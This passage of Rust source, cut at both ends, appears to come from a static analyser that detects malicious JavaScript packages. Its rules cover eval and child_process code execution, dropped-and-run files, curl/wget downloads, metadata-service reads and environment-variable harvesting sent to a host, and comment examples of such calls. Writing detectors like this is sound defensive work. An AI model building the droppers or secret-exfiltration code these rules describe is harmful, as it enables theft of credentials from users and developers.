        let named = |n: &str| eq(&name, n);
        if named("_compile") || named("runInThisContext") || named("runInNewContext") || named("runInContext") || named("compileFunction") {
            return Some(Runs { cat: RUN_CODE, from: 0, rest: false });
        }
        // (an execSync of any object runs its command line, as the text's
        // reading counts it: no regular expression or database has one; an
        // `exec` is child_process's only by its names)
        if named("execSync") {
            return Some(Runs { cat: RUN_CODE, from: 0, rest: false });
        }
        // o['eval'](code), o['Function'](code)
        if computed && named("eval") {
            return Some(Runs { cat: RUN_CODE, from: 0, rest: false });
        }
        if computed && named("Function") {
            return Some(Runs { cat: RUN_CODE, from: 0, rest: true });
        }
        // eval.call(t, code), Function.apply(t, [code])
        if named("call") || named("apply") {
            let on = self.sc_names(obj, scope);
            if let Some(r) = runs_of(&on).filter(|r| r.cat == RUN_CODE) {
                return Some(Runs { cat: RUN_CODE, from: 1, rest: r.rest });
            }
        }
        // Function's own constructor: Object.constructor(code), x.constructor.constructor(code)
        if named("constructor") {
            let a = self.a();
            let ctor = (a.kind(obj) == Kind::Identifier && is_one(a.name(obj), CONSTRUCTORS))
                || (a.kind(obj) == Kind::MemberExpression && a.prop_name(obj).is_some_and(|n| eq(&n, "constructor")));
            if ctor {
                return Some(Runs { cat: RUN_CODE, from: 0, rest: true });
            }
        }
        if SPAWNS.iter().any(|s| named(s)) && self.sc_interp(node) {
            return Some(Runs { cat: RUN_CODE, from: 1, rest: false });
        }
        None
    }

    /// Is a call's first argument an interpreter, and its second a list
    /// that holds a flag making it run code (`_DL_INTERP`)?
    fn sc_interp(&self, node: NodeId) -> bool {
        let a = self.a();
        let args = a.list(node, jt::B);
        let (first, second) = match (args.first(), args.get(1)) {
            (Some(&f), Some(&s)) => (f, s),
            _ => return false,
        };
        let interp = match self.sc_const_str(first) {
            Some(s) => {
                let base = match s.iter().rposition(|&c| c == 0x2F || c == 0x5C) {
                    Some(k) => &s[k + 1..],
                    None => &s[..],
                };
                let base = if base.len() > 4 && eq(&base[base.len() - 4..], ".exe") { &base[..base.len() - 4] } else { base };
                is_one(base, INTERPRETERS) || (base.len() > 6 && eq(&base[..6], "python"))
            }
            None => {
                let n = &a.0.nodes[first as usize];
                let text = self.sup().span(n.start, n.end).to_vec();
                eq(&text, "process.execPath") || eq(&text, "process.argv[0]")
            }
        };
        interp
            && a.kind(second) == Kind::ArrayExpression
            && a.list(second, jt::A).iter().any(|&e| e != NONE && self.sc_const_str(e).is_some_and(|s| is_one(&s, EVAL_FLAGS)))
    }

    // ------------------------------------------- a file written, then run --

    /// The interpreter a program node is, as reasons name it (`node` for
    /// `process.execPath`).
    fn sc_interp_name(&self, n: NodeId) -> Option<PyStr> {
        if let Some(s) = self.sc_const_str(n) {
            return interp_name(&s);
        }
        let a = self.a();
        let nd = &a.0.nodes[n as usize];
        let text = self.sup().span(nd.start, nd.end).to_vec();
        (eq(&text, "process.execPath") || eq(&text, "process.argv[0]")).then(|| u("node"))
    }

    /// The keys of the path a node names, to tell a file run is one the
    /// script wrote: its text in the scope of the first name in it that is
    /// bound (one function's local `p` is not another's), the strings it
    /// holds (a literal, a name given one), and those of what a wrapper is
    /// given (`path.resolve(p)`, `String(p)`, `` `${p}` ``, `p.toString()`).
    fn sc_path_keys(&mut self, n: NodeId, scope: ScopeId) -> Vec<PyStr> {
        let mut keys = Vec::new();
        self.sc_path_keys_at(n, scope, 0, &mut keys);
        keys.sort_unstable();
        keys.dedup();
        keys
    }

    fn sc_path_keys_at(&mut self, n: NodeId, scope: ScopeId, depth: u32, keys: &mut Vec<PyStr>) {
        if n == NONE || depth > 3 {
            return;
        }
        let n = self.a().unwrap(n);
        if let Some(s) = self.sc_const_str(n) {
            keys.push(value_key(&s));
            return;
        }
        // (the names it reads: not a member's own name)
        let idents: Vec<NodeId> = {
            let a = self.a();
            let mut out = Vec::new();
            let mut stack = vec![n];
            while let Some(x) = stack.pop() {
                if out.len() > 16 {
                    break;
                }
                match a.kind(x) {
                    Kind::Identifier => out.push(x),
                    Kind::MemberExpression if !a.computed(x) => stack.push(a.at(x, jt::A)),
                    _ => stack.extend(a.kids(x).into_iter().rev()),
                }
            }
            out
        };
        let bound = idents.iter().find_map(|&i| self.bind(i, scope));
        let mut k = u(&match bound {
            Some(b) => format!("b{}:", b),
            None => "g:".to_string(),
        });
        let (lo, hi) = {
            let nd = &self.a().0.nodes[n as usize];
            (nd.start, nd.end)
        };
        k.extend(text_key(self.sup().span(lo, hi)));
        keys.push(k);
        let kind = self.a().kind(n);
        match kind {
            Kind::Identifier => {
                if let Some(values) = self.sc_const_strs(n, scope, 0) {
                    keys.extend(values.iter().map(|v| value_key(v)));
                }
            }
            Kind::TemplateLiteral => {
                let (quasis, exprs) = {
                    let a = self.a();
                    (a.list(n, jt::A).to_vec(), a.list(n, jt::B).to_vec())
                };
                if exprs.len() == 1 && quasis.iter().all(|&q| self.a().s(q, jt::A).is_empty()) {
                    self.sc_path_keys_at(exprs[0], scope, depth + 1, keys);
                }
            }
            Kind::CallExpression => {
                let (callee, args) = {
                    let a = self.a();
                    (a.unwrap(a.at(n, jt::A)), a.list(n, jt::B).to_vec())
                };
                let names = self.sc_names(callee, scope);
                let wrapper = names.iter().any(|x| is_one(x, &["path.resolve", "path.normalize", "String", "path.posix.resolve", "path.win32.resolve"]));
                if wrapper && args.len() == 1 {
                    self.sc_path_keys_at(args[0], scope, depth + 1, keys);
                } else if args.is_empty() && self.a().kind(callee) == Kind::MemberExpression && self.a().prop_name(callee).is_some_and(|p| eq(&p, "toString")) {
                    let obj = self.a().at(callee, jt::A);
                    self.sc_path_keys_at(obj, scope, depth + 1, keys);
                }
            }
            _ => {}
        }
    }

    /// The parts a command line is made of: a sum's operands, a template's
    /// text and holes, else the node.
    fn sc_parts(&self, n: NodeId) -> Vec<Part<NodeId>> {
        let a = self.a();
        let n = a.unwrap(n);
        match a.kind(n) {
            Kind::BinaryExpression if a.operator(n) == "+" => {
                let mut out = self.sc_parts(a.at(n, jt::A));
                out.extend(self.sc_parts(a.at(n, jt::B)));
                out
            }
            Kind::TemplateLiteral => {
                let (quasis, exprs) = (a.list(n, jt::A), a.list(n, jt::B));
                let mut out = Vec::new();
                for (k, &q) in quasis.iter().enumerate() {
                    out.push(Part::Text(a.s(q, jt::A).to_vec()));
                    if let Some(&e) = exprs.get(k) {
                        out.push(Part::Expr(e));
                    }
                }
                out
            }
            _ => match self.sc_const_str(n) {
                Some(s) => vec![Part::Text(s)],
                None => vec![Part::Expr(n)],
            },
        }
    }

    /// supply mode: what a binary read of a file gives (`readFileSync(p)`,
    /// `readFile(p, cb)`: no encoding): its bytes (K_BYTES, what: the file).
    fn sc_binary_read(&mut self, node: NodeId, name: Option<&[u32]>, scope: ScopeId) -> Option<V> {
        let name = name?;
        if !is_one(name, &["readFileSync", "readFile"]) {
            return None;
        }
        let args = self.a().list(node, jt::B).to_vec();
        let first = *args.first()?;
        if let Some(&opts) = args.get(1) {
            let a = self.a();
            let text_read = match a.kind(opts) {
                Kind::Literal => a.is_string(opts),
                Kind::ObjectExpression => {
                    let nd = &a.0.nodes[opts as usize];
                    pystr::contains(self.sup().span(nd.start, nd.end), "encoding")
                }
                Kind::ArrowFunctionExpression | Kind::FunctionExpression => false,
                _ => true, // (options the script keeps elsewhere: not known to be bytes)
            };
            if text_read {
                return None;
            }
        }
        let (at, line) = (self.a().0.nodes[node as usize].start, self.call_line(node));
        let what = match self.sc_const_strs(first, scope, 0).and_then(|v| v.into_iter().next()).or_else(|| self.sc_path_tail(first, scope, 0)) {
            Some(v) => pystr::upto(&v, 60).to_vec(),
            None => {
                let nd = &self.a().0.nodes[first as usize];
                pystr::upto(self.sup().span(nd.start, nd.end), 60).to_vec()
            }
        };
        Some(self.sc_source(K_BYTES, what, at, line, 0))
    }

    /// The literal end of a path a node builds, to name the file
    /// (`path.join(__dirname, 'assets', 'logo.png')`: assets/logo.png;
    /// `__dirname + '/x.bin'`, `` `${d}/x.bin` ``).
    fn sc_path_tail(&mut self, n: NodeId, scope: ScopeId, depth: u32) -> Option<PyStr> {
        if depth > 4 {
            return None;
        }
        let n = self.a().unwrap(n);
        let mut tail: Vec<PyStr> = Vec::new();
        match self.a().kind(n) {
            Kind::CallExpression => {
                let callee = self.a().unwrap(self.a().at(n, jt::A));
                let names = self.sc_names(callee, scope);
                if !names.iter().any(|x| is_one(x, &["path.join", "path.resolve", "path.posix.join", "path.win32.join"])) {
                    return None;
                }
                let args = self.a().list(n, jt::B).to_vec();
                for &x in args.iter().rev() {
                    match self.sc_const_str(x) {
                        Some(v) => tail.push(v),
                        None => break,
                    }
                }
            }
            Kind::BinaryExpression if self.a().operator(n) == "+" => {
                let (l, r) = (self.a().at(n, jt::A), self.a().at(n, jt::B));
                match self.sc_const_str(r) {
                    Some(v) => {
                        tail.push(v);
                        if let Some(more) = self.sc_path_tail(l, scope, depth + 1) {
                            tail.push(more);
                        }
                    }
                    None => return None,
                }
            }
            Kind::TemplateLiteral => {
                let last = *self.a().list(n, jt::A).last()?;
                tail.push(self.a().s(last, jt::A).to_vec());
            }
            _ => return None,
        }
        tail.reverse();
        let mut out: PyStr = Vec::new();
        for piece in &tail {
            let piece = pystr::strip_chars(piece, "/\\");
            if piece.is_empty() {
                continue;
            }
            if !out.is_empty() {
                out.push(0x2F);
            }
            out.extend_from_slice(piece);
        }
        (!out.is_empty()).then_some(out)
    }

    /// supply mode: `buf.subarray(n)`, `buf.slice(n, m)` of a binary read,
    /// past its start: bytes carved out of the file (K_CARVED).
    fn sc_carved(&self, node: NodeId, recv: &V, name: Option<&[u32]>) -> Option<V> {
        let sc = recv.sc.as_ref()?;
        if sc.kinds & K_BYTES == 0 || !name.is_some_and(|n| is_one(n, &["slice", "subarray"])) {
            return None;
        }
        let a = self.a();
        let first = *a.list(node, jt::B).first()?;
        if a.kind(first) == Kind::Literal && a.op(first) == jt::L_NUMBER && {
            let nd = &a.0.nodes[first as usize];
            eq(self.sup().span(nd.start, nd.end), "0")
        } {
            return None;
        }
        let bit = bit_index(K_BYTES);
        let what = sc.firsts.iter().find(|(k, _, _)| *k == bit).map(|(_, w, _)| (**w).clone()).unwrap_or_default();
        let (at, line) = (a.0.nodes[node as usize].start, self.call_line(node));
        Some(self.sc_source(K_CARVED, what, at, line, 0))
    }

    /// supply mode: a call that writes a file. `createWriteStream(p)` is the
    /// file (its value, K_WFILE, carries the path's keys); `writeFileSync(p,
    /// d)`, a stream's `write(d)` or `end(d)`, `src.pipe(stream)` record what
    /// they write where (`Supply::written`). Some(value) for a stream made.
    fn sc_file_write(&mut self, node: NodeId, member: bool, name: Option<&[u32]>, recv: &V, args: &[V], scope: ScopeId) -> Option<V> {
        let name = name?;
        let at = self.a().0.nodes[node as usize].start;
        let arg_nodes = self.a().list(node, jt::B).to_vec();
        if eq(name, "createWriteStream") {
            let keys = self.sc_path_keys(*arg_nodes.first()?, scope);
            let what = pystr::join(&u("\n"), &keys.iter().map(|k| k.as_slice()).collect::<Vec<_>>());
            return Some(self.sc_source(K_WFILE, what, at, self.call_line(node), 0));
        }
        let stream_keys = |v: &V| -> Option<Vec<PyStr>> {
            let sc = v.sc.as_ref()?;
            let (_, what, _) = sc.firsts.iter().find(|(k, _, _)| (1u16 << k) == K_WFILE)?;
            Some(pystr::split_char(what.as_slice(), 0x0A).into_iter().map(|k| k.to_vec()).collect())
        };
        let (keys, data): (Vec<PyStr>, Option<V>) = if is_one(name, WRITE_FILES) {
            match arg_nodes.first() {
                Some(&p) => (self.sc_path_keys(p, scope), args.get(1).cloned()),
                None => return None,
            }
        } else if member && is_one(name, &["write", "end"]) {
            match stream_keys(recv) {
                Some(k) => (k, args.first().cloned()),
                None => return None,
            }
        } else if member && eq(name, "pipe") {
            match args.first().and_then(|a| stream_keys(a)) {
                Some(k) => (k, Some(recv.plain())),
                None => return None,
            }
        } else {
            return None;
        };
        if let Some(sc) = data.as_ref().filter(|d| d.src).and_then(|d| d.sc.clone()) {
            record_written(&self.sup().written, keys, &sc, at);
        }
        None
    }

    /// supply mode: a call that runs a program (`spawn(p)`, `execSync(p +
    /// ' -q')`, `fork(p)`, an interpreter given a script): a file the script
    /// wrote with code or a program it decodes, carves out of another file,
    /// or downloads (a script run by an interpreter) is a dropper's; a
    /// program it decodes, run, is code it decodes.
    fn sc_file_run(&mut self, node: NodeId, names: &[PyStr], member: bool, name: Option<&[u32]>, args: &[V], scope: ScopeId) {
        let simple = name.unwrap_or(&[]);
        let cp = names.iter().any(|x| x.len() > 14 && eq(&x[..14], "child_process."));
        let is = |n: &str| eq(simple, n) || names.iter().any(|x| x.len() > 14 && eq(&x[..14], "child_process.") && eq(&x[14..], n));
        let shell = ["exec", "execSync", "execaCommand", "execaCommandSync"].iter().any(|n| is(n));
        let program = ["spawn", "spawnSync", "execFile", "execFileSync", "execa", "execaSync"].iter().any(|n| is(n));
        let fork = is("fork");
        // (`re.exec(s)`, `db.exec(sql)`: a member named exec is child_process's only by its names)
        if !(shell || program || fork) || (member && eq(simple, "exec") && !cp) {
            return;
        }
        let at = self.a().0.nodes[node as usize].start;
        let arg_nodes = self.a().list(node, jt::B).to_vec();
        let first = match arg_nodes.first() {
            Some(&f) => self.a().unwrap(f),
            None => return,
        };
        let mut runs: Vec<(NodeId, Option<PyStr>)> = Vec::new();
        let mut lines: Vec<PyStr> = Vec::new();
        if fork {
            runs.push((first, Some(u("node"))));
        } else if shell {
            match self.sc_const_str(first) {
                Some(s) => lines.push(s),
                None if self.a().kind(first) == Kind::Identifier => lines.extend(self.sc_const_strs(first, scope, 0).unwrap_or_default()),
                None => {}
            }
            let parts = self.sc_parts(first);
            runs.extend(run_parts(&parts));
        } else {
            runs.push((first, None));
            if let Some(interp) = self.sc_interp_name(first) {
                if let Some(&list) = arg_nodes.get(1) {
                    if self.a().kind(list) == Kind::ArrayExpression {
                        let items: Vec<NodeId> = self.a().list(list, jt::A).iter().copied().filter(|&e| e != NONE).take(6).collect();
                        if let Some(s) = items.into_iter().find(|&x| !self.sc_const_str(x).is_some_and(|s| is_flag(&s))) {
                            runs.push((s, Some(interp)));
                        }
                    }
                }
            }
            // (a program it decodes, run)
            if let Some(v) = args.first() {
                if v.src && self.emit {
                    if let Some(from) = v.sc.as_ref().and_then(|s| decoded_at(s)) {
                        self.findings.push(Out::Decoded { at, from });
                    }
                }
            }
        }
        if !self.emit {
            return;
        }
        let sup = self.sup();
        for (n, interp) in runs {
            let keys = self.sc_path_keys(n, scope);
            if let Some(w) = written_at(&sup.written, &keys) {
                self.sc_dropped(&w, interp, at);
                return;
            }
        }
        // a constant command line: a written file it runs (`_DL_RUNNERS`)
        if !lines.is_empty() {
            let table = sup.written.borrow().clone();
            for w in table {
                for k in w.keys.iter().filter(|k| k.first() == Some(&0x3D)) {
                    let seg = lines.iter().flat_map(|l| l.split(|&c| c == 0x3B || c == 0x26 || c == 0x7C || c == 0x0A)).find(|seg| {
                        crate::received::command_runs(sup.p(), seg, &k[1..])
                    });
                    if let Some(seg) = seg {
                        let interp = pystr::split_ws(seg).first().and_then(|w| interp_name(w));
                        self.sc_dropped(&w, interp, at);
                        return;
                    }
                }
            }
        }
    }

    /// The finding for a written file run: what it held decoded or carved
    /// out of another file, or downloaded and run by an interpreter.
    fn sc_dropped(&mut self, w: &Written, interp: Option<PyStr>, at: u32) {
        let interp = script_interp(w, interp);
        if w.kinds & (K_DECODED | K_CARVED) == 0 && interp.is_none() {
            return; // (a program downloaded and run: what installers of binaries do)
        }
        self.findings.push(Out::Dropped { at, from: w.at, kinds: w.kinds, what: w.what.clone(), interp });
    }

    /// Is a call's first argument a command line that downloads (curl or
    /// wget first, `downloads`)? What it prints is received.
    fn sc_download(&self, node: NodeId) -> bool {
        let a = self.a();
        let first = match a.list(node, jt::B).first() {
            Some(&f) => f,
            None => return false,
        };
        let head = if a.kind(first) == Kind::ArrayExpression {
            match a.list(first, jt::A).first() {
                Some(&e) if e != NONE => e,
                _ => return false,
            }
        } else {
            first
        };
        let text: PyStr = match a.kind(head) {
            Kind::TemplateLiteral => a.list(head, jt::A).first().map(|&q| a.s(q, jt::A).to_vec()).unwrap_or_default(),
            _ => match a.str_value(head) {
                Some(s) => s.to_vec(),
                None => return false,
            },
        };
        // (the metadata test reads the argument's whole text: a template's holes too)
        let n = &a.0.nodes[first as usize];
        let sup = self.sup();
        let whole = sup.span(n.start, n.end);
        let mut both = text.clone();
        both.push(0x20);
        both.extend_from_slice(whole);
        downloads(sup.p(), &text) && downloads(sup.p(), &both)
    }

    /// A URL literal whose host the next part continues, joined with `v`:
    /// what is resolved in a host name is sent (the text follower's
    /// `_LD_HOST_BUILT_RE`).
    pub(super) fn sc_host_built(&mut self, lit: NodeId, v: &V) {
        if !v.tainted() {
            return;
        }
        let (prefix, at) = {
            let a = self.a();
            let text = match a.kind(lit) {
                Kind::Literal => a.str_value(lit).map(|s| s.to_vec()),
                Kind::TemplateLiteral => a.list(lit, jt::A).first().map(|&q| a.s(q, jt::A).to_vec()),
                _ => None,
            };
            (text.is_some_and(|t| host_prefix(&t)), a.0.nodes[lit as usize].start)
        };
        if prefix {
            let label = Rc::new(self.p.fns[self.fid as usize].label());
            self.sc_reach(v, SEND_DATA, at, &label);
        }
    }

    /// A call of the script's wrapper of exec (its parameter `i` is the
    /// command line): what the command prints, when the call gives it as a
    /// constant.
    pub(super) fn sc_wrapper_output(&self, node: NodeId, i: usize) -> Option<V> {
        let (arg, at, line) = {
            let a = self.a();
            let args = a.list(node, jt::B);
            let arg = *args.get(i)?;
            if args.iter().take(i + 1).any(|&x| a.kind(x) == Kind::SpreadElement) {
                return None;
            }
            (arg, a.0.nodes[node as usize].start, self.call_line(node))
        };
        let command = self.sc_const_str(arg)?;
        let sup = self.sup();
        let p = sup.p();
        if p.re("_LD_METADATA_RE").search(&command).is_some() {
            return Some(self.sc_source(K_CREDENTIALS, u("the instance's metadata"), at, line, 0));
        }
        if downloads(p, &command) {
            return Some(self.sc_source(K_RECEIVED, u("a download"), at, line, 0));
        }
        let (kind, what) = crate::shell::sh_output_data(p, &command, 0, None).into_iter().next()?;
        Some(self.sc_source(kind_bit(kind, &what, &sup.whole), what, at, line, 0))
    }

    /// A call of the script's own reader (its parameter `i` is the path),
    /// given a path outside the package: what it reads; of the script's own
    /// `getEnv(name)`, given a constant name: that variable.
    pub(super) fn sc_wrapper_read(&self, node: NodeId, cat: u8, t: &V, i: usize) -> Option<V> {
        let (at, line) = (self.a().0.nodes[node as usize].start, self.call_line(node));
        if cat == READ_PATH {
            let sc = t.sc.as_ref()?;
            let (_, what, _) = sc.firsts.iter().find(|(k, _, _)| (1u16 << k) == K_PATH)?;
            return Some(self.sc_source(K_FILE, pystr::upto(what, 60).to_vec(), at, line, 0));
        }
        if cat == ENV_NAME {
            let arg = {
                let a = self.a();
                let args = a.list(node, jt::B);
                if args.iter().take(i + 1).any(|&x| a.kind(x) == Kind::SpreadElement) {
                    return None;
                }
                *args.get(i)?
            };
            let name = self.sc_const_str(arg)?;
            let v = self.sc_env_var(&name, at, line);
            return if v.tainted() { Some(v) } else { None };
        }
        None
    }

    /// The finding for local data `sc` at a send.
    pub(super) fn sc_emit(&mut self, sc: &Sc, address: bool, at: u32) {
        // (a harvest first, then the first read)
        let pick = |strong_only: bool| {
            sc.firsts
                .iter()
                .filter(|(k, _, _)| (1u16 << k) & NOT_LOCAL == 0)
                .filter(|(k, _, _)| !strong_only || (1u16 << k) & STRONG_IN_ADDRESS != 0)
                .min_by_key(|(k, _, a)| ((1u16 << k) & HARVEST == 0, *a))
                .cloned()
        };
        let (chosen, in_address) = if !address {
            (pick(false), false)
        } else {
            match pick(true) {
                Some(c) => (Some(c), false),
                None => (pick(false), true),
            }
        };
        if let Some((k, what, _)) = chosen {
            self.findings.push(Out::Send { at, kind: KIND_NAMES[k as usize], what: (*what).clone(), in_address });
        }
    }

    /// The functions a call's arguments are (a callback, a function's name).
    fn sc_fn_args(&mut self, node: NodeId, scope: ScopeId) -> Vec<FnId> {
        let m = self.m;
        let arg_nodes = self.a().list(node, jt::B).to_vec();
        let mut out = Vec::new();
        for an in arg_nodes {
            let k = self.a().kind(an);
            if self.a().is_function(an) {
                out.push(self.p.mods[m as usize].fid_at[an as usize]);
            } else if matches!(k, Kind::Identifier | Kind::MemberExpression) {
                for d in self.p.descs_of_expr(m, an, scope, 0) {
                    if let D::Fn(f) = d {
                        out.push(f);
                    }
                }
            }
        }
        dedupe(out)
    }

    /// Callbacks given a value: each parameter holds it (a read's callback
    /// gets what was read; a callback of anything else, what the call
    /// holds: its receiver and its other arguments). Their value.
    fn sc_callbacks(&mut self, node: NodeId, val: &V, scope: ScopeId) -> V {
        if !val.tainted() {
            return V::empty();
        }
        let fids = self.sc_fn_args(node, scope);
        if fids.is_empty() {
            return V::empty();
        }
        let line = self.call_line(node);
        let mut out = V::empty();
        for fid in fids {
            let n = self.p.fns[fid as usize].params.len().max(1);
            let cb_args = vec![val.plain(); n];
            out = out.union(&self.apply(node, &[fid], &cb_args, -1, line, false));
        }
        out
    }

    /// A method call on an instance (not on `this`) of a class made in
    /// several places (descs::Program::sc_made_widely)?
    fn sc_instance_call(&mut self, callee: NodeId, fids: &[FnId]) -> bool {
        if self.a().kind(self.a().at(callee, jt::A)) == Kind::ThisExpression {
            return false;
        }
        fids.iter().any(|&f| match self.p.fns[f as usize].cls {
            Some(c) => self.p.sc_made_widely(c),
            None => false,
        })
    }

    /// Is a call made on an instance from outside it — `new C(…)`, `s.m(…)`
    /// — not on `this` (`this.m(…)`, `super(…)`, `super.m(…)`)? What a
    /// method of a class made in several places is given there goes to
    /// that instance, not to every instance's `this.x` (apply).
    pub(super) fn sc_on_instance(&self, node: NodeId) -> bool {
        if self.p.cfg.supply.is_none() {
            return false;
        }
        let a = self.a();
        match a.kind(node) {
            Kind::NewExpression => true,
            Kind::CallExpression => {
                let callee = a.unwrap(a.at(node, jt::A));
                match a.kind(callee) {
                    Kind::Super => false,
                    Kind::MemberExpression => !matches!(a.kind(a.at(callee, jt::A)), Kind::ThisExpression | Kind::Super),
                    _ => true,
                }
            }
            _ => false,
        }
    }

    /// A for-in or for-of loop over the environment's variables whose body
    /// is a test of them alone, one that selects some (`for (const k in
    /// process.env) if (k.startsWith('VITE_')) env[k] = process.env[k]`):
    /// what it reads is not the whole environment, unless the test excludes
    /// some or names secrets (the `.filter` rule; the text follower's
    /// _LD_ENV_SELECT_RE).
    pub(super) fn sc_loop_selects_env(&self, st: NodeId, it: &V) -> bool {
        if !it.sc.as_ref().is_some_and(|s| s.kinds & K_WHOLE_ENV != 0) {
            return false;
        }
        let a = self.a();
        // the loop's variables
        let left = a.at(st, jt::A);
        let pats: Vec<NodeId> = if a.kind(left) == Kind::VariableDeclaration {
            a.list(left, jt::A).iter().map(|&d| a.at(d, jt::A)).collect()
        } else {
            vec![left]
        };
        let names: Vec<PyStr> =
            pats.iter().flat_map(|&p| a.pattern_names(p)).map(|(id, _)| a.name(id).to_vec()).collect();
        if names.is_empty() {
            return false;
        }
        // its body: one if statement, no else
        let mut body = a.at(st, jt::C);
        if a.kind(body) == Kind::BlockStatement {
            match a.list(body, jt::A) {
                [only] => body = *only,
                _ => return false,
            }
        }
        if a.kind(body) != Kind::IfStatement || a.opt(body, jt::C).is_some() {
            return false;
        }
        let test = a.at(body, jt::A);
        // (a test of the loop's variables)
        let mut stack = vec![test];
        let mut reads = false;
        while let Some(n) = stack.pop() {
            if a.kind(n) == Kind::Identifier && names.iter().any(|x| x.as_slice() == a.name(n)) {
                reads = true;
                break;
            }
            stack.extend(a.kids(n));
        }
        if !reads {
            return false;
        }
        self.sc_selects(test)
    }

    /// Does a test of the environment's variables select some, not exclude
    /// some or name secrets (_LD_EXCLUDES_RE, _SH_SECRET_VAR_RE in its text)?
    /// What the names it reads are given in this file counts as its text: a
    /// list of patterns (`sensitivePatterns.some((p) => p.test(k))`, where
    /// the list holds /TOKEN/ and /SECRET/), a parameter's default
    /// (vite's `prefixes = 'VITE_'`).
    pub(super) fn sc_selects(&self, test: NodeId) -> bool {
        let sup = self.sup();
        let p = sup.p();
        let a = self.a();
        let (lo, hi) = (a.0.nodes[test as usize].start, a.0.nodes[test as usize].end);
        let cond = sup.span(lo, hi);
        if p.re("_LD_EXCLUDES_RE").search(cond).is_some() || p.re("_SH_SECRET_VAR_RE").search(cond).is_some() {
            return false;
        }
        // the names the test reads (not a member's name), bound outside it
        let mut given: Vec<(u32, u32)> = Vec::new();
        let mut seen: Vec<BindId> = Vec::new();
        let mut stack = vec![test];
        while let Some(n) = stack.pop() {
            match a.kind(n) {
                Kind::Identifier => {
                    let b = self.p.mods[self.m as usize].bind_at[n as usize];
                    if b == UNSET || b == GLOBAL || seen.contains(&b) || seen.len() >= 8 {
                        continue;
                    }
                    seen.push(b);
                    for w in self.p.binds[b as usize].writes.iter().take(8) {
                        let node = match w {
                            Write::Init { node, .. } | Write::Assign { node, .. } | Write::Param { node, .. } => *node,
                            _ => continue,
                        };
                        let span = (a.0.nodes[node as usize].start, a.0.nodes[node as usize].end);
                        if self.p.binds[b as usize].module == self.m && !(lo <= span.0 && span.1 <= hi) {
                            given.push(span);
                        }
                    }
                }
                Kind::MemberExpression if !a.computed(n) => stack.push(a.at(n, jt::A)),
                _ => stack.extend(a.kids(n)),
            }
        }
        given.iter().all(|&(s, e)| p.re("_SH_SECRET_VAR_RE").search(sup.span(s, e.min(s + 4000))).is_none())
    }

    /// `this.x` in a method of a class or an object literal: the binding
    /// the model keeps for that member (made when first met), or None.
    pub(super) fn sc_this_member(&mut self, member: NodeId, scope: ScopeId) -> Option<BindId> {
        let (obj, name) = {
            let a = self.a();
            if a.kind(member) != Kind::MemberExpression || a.computed(member) {
                return None;
            }
            (a.at(member, jt::A), a.prop_name(member)?)
        };
        if self.a().kind(obj) != Kind::ThisExpression {
            return None;
        }
        let owner = self.p.this_descs(scope).into_iter().find_map(|d| match d {
            D::Inst(c) => Some((1u8, c)),
            D::Obj(o) => Some((2u8, o)),
            _ => None,
        })?;
        let key = (owner.0, owner.1, name.clone());
        if let Some(&b) = self.p.sc_props.get(&key) {
            return Some(b);
        }
        let m = self.m;
        let bid = self.p.binds.len() as BindId;
        let fid = self.p.mods[m as usize].fn_;
        self.p.binds.push(Bind {
            bid,
            name,
            kind: BindKind::Var,
            fid,
            writes: Vec::new(),
            shared: true,
            module: m,
            refs: Vec::new(),
            targets: None,
        });
        if owner.0 == 1 {
            self.p.sc_this_class.insert(bid, owner.1);
        }
        self.p.sc_props.insert(key, bid);
        Some(bid)
    }

    /// supply mode: a member's value, or None for the default reading.
    /// `key`: a computed member's key, its value.
    pub(super) fn sc_member(&mut self, node: NodeId, obj: &V, key: &V, scope: ScopeId) -> Option<V> {
        let (computed, name, objn, at, line) = {
            let a = self.a();
            let computed = a.computed(node);
            let line = if computed { a.line(node) } else { a.line(a.at(node, jt::B)) };
            (computed, a.prop_name(node), a.at(node, jt::A), a.0.nodes[node as usize].start, line)
        };
        // process.env
        if name.as_deref().is_some_and(|n| eq(n, "env")) && self.a().is_ident_named(objn, "process") && self.bind(objn, scope).is_none() {
            let whole = self.sup().whole.clone();
            return Some(self.sc_source(K_WHOLE_ENV, whole, at, line, OBJ_ENV));
        }
        // one of its variables; by a name it computes: every variable when
        // the name comes from the environment itself (a copy of it), the
        // variable a caller names (`getEnv(name)`), else none
        if obj.kind & OBJ_ENV != 0 {
            return Some(match name {
                Some(n) => {
                    let stored = match self.sc_env_member(node, scope) {
                        Some(b) => self.read(b),
                        None => V::empty(),
                    };
                    self.sc_env_var(&n, at, line).union(&stored)
                }
                None => {
                    if key.sc.as_ref().is_some_and(|s| s.kinds & K_WHOLE_ENV != 0) {
                        obj.plain()
                    } else {
                        if !key.params.is_empty() {
                            let label = Rc::new(self.p.fns[self.fid as usize].label());
                            let entry: Entry = (self.m, at, label, false);
                            for &k in key.params.iter() {
                                self.reach_adds.push((k, ENV_NAME, entry.clone()));
                            }
                        }
                        V::empty()
                    }
                }
            });
        }
        // a function that reads local data, as a value: `tryGet(os.hostname)`
        if let Some(n) = &name {
            if !computed && self.sc_reader_name(n) {
                let m = self.m;
                let names: Vec<PyStr> = self
                    .p
                    .descs_of_expr(m, node, scope, 0)
                    .into_iter()
                    .filter_map(|d| if let D::Builtin(b) = d { Some(b) } else { None })
                    .collect();
                if let Some(v) = self.sc_module_source(&names, at, line) {
                    return Some(v);
                }
            }
        }
        // a member of `this`
        if !computed {
            if let Some(b) = self.sc_this_member(node, scope) {
                return Some(self.read(b));
            }
        }
        None
    }

    /// supply mode: a call (sources, sends, connections, clients,
    /// callbacks). Its value.
    pub(super) fn sc_call(&mut self, node: NodeId, recv: &V, callee_val: &V, args: &[V], spread: isize, scope: ScopeId) -> R<V> {
        let callee = self.a().unwrap(self.a().at(node, jt::A));
        let member = self.a().kind(callee) == Kind::MemberExpression;
        let name: Option<PyStr> = if member {
            self.a().prop_name(callee)
        } else if self.a().is_ident(callee) {
            Some(self.a().name(callee).to_vec())
        } else {
            None
        };
        let named = |n: &str| name.as_deref().is_some_and(|x| eq(x, n));
        let names = self.sc_names(callee, scope);
        // received code: code run, a module's name loaded, data deserialized
        if let Some(r) = self.sc_runs(node, callee, &names, scope) {
            let at = self.a().0.nodes[node as usize].start;
            let v = if spread >= 0 && spread as usize <= r.from {
                union_all(args.iter().skip(spread as usize))
            } else if r.rest {
                union_all(args.iter().skip(r.from))
            } else {
                args.get(r.from).cloned().unwrap_or_else(V::empty)
            };
            // (a command line that runs a fixed program given the data as
            // its argument runs no code it receives: `exec('curl … ' + data)`;
            // an interpreter given it as code does: `exec('node -e ' + code)`)
            let shell = names
                .iter()
